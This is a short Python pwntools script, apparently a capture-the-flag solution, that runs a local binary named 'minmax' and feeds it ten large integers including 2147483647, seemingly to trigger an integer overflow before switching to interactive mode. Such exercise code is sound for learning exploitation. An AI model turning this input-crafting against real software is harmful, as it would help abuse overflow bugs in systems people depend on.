from pwn import * 
context.binary = exe =ELF("./minmax",checksec=False)
p = process(exe.path)
value = [
    2147483647,
    1000000000,
    123456789,
    500000000,
    987654321,
    999999999,
    1234567,
    888888888,
    111111111,
    777777777
]
p.sendlineafter(b"how much?:",b"10")
for i in range(10):
    p.sendlineafter(b"enter positive number only:",str(value[i]).encode())


p.interactive()